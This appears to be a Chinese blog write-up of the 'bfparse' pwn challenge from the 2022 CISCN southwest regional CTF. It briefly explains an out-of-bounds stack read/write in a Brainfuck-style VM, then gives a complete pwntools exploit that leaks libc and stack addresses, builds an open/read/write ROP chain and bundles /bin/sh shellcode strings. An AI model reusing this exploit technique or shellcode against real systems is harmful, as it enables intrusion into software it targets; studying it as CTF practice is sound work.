---
title: 2022 ciscn西南分区赛 pwn Writeup
date: 2022-07-11 18:54:59 +0800
categories:
  - ctf比赛
tags:
  - pwn
  - ctf
permalink: /posts/id=32/
pin: false
published:
---
## bfparse

![image-20220711181159179](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220711181159179.png)

题目是9.8的版本，calloc开辟了一段空间，典型的VMpwn，逆向一下输入

```
+ 3
, 6
- 4
.5
< 2
> 1
[ 7
] 8
```



![image-20220711181231466](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220711181231466.png)

漏洞点在于执行命令时存在对栈的读入和栈的泄露操作，且下标可控，通过计算偏移在返回地址处写入orw

![image-20220711181319999](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220711181319999.png)

```python
# _*_ coding:utf-8 _*_
from pwn import *
# context.log_level='debug'

p = process("./pwn")
p = remote('192.168.0.99','58011')
# p = remote("node4.buuoj.cn","28559")
elf = ELF("./pwn")
# libc = elf.libc
libc = ELF('./libc.so.6')

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

buf = 0x4040
idx = 0x8440
Order = 0x8040
#-------------------------------------
pay = '>'*0x000238+'.>'*8+'>'*8+'.>'*8+'<'*0x38+',>'*0x90
s(pay)
libc_base = uu64()-243-libc.sym['__libc_start_main']
lg('libc_base')

stack = uu64()
lg('stack')

pop_rdi = 0x0000000000023b6a+libc_base
pop_rsi = 0x000000000002601f+libc_base
pop_rdx = 0x0000000000142c92+libc_base
syscall = 0x00000000000630a9+libc_base
pop_rax = 0x0000000000036174+libc_base
bin_sh = libc_base+libc.search("/bin/sh\x00").next()
Open = libc_base+libc.sym['open']
Read = libc_base+libc.sym['read']
Write = libc_base+libc.sym['write']
environ = libc_base+libc.sym["environ"]
flag_addr = stack-0x88
lg('pop_rdi')
#------------------------------------------------------
pay = p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(Open)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(environ)+p64(pop_rdx)+p64(0x60)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)+'flag\x00\x00\x00\x00'
s(pay)
# 0x7f23903a8000
p.interactive()
```

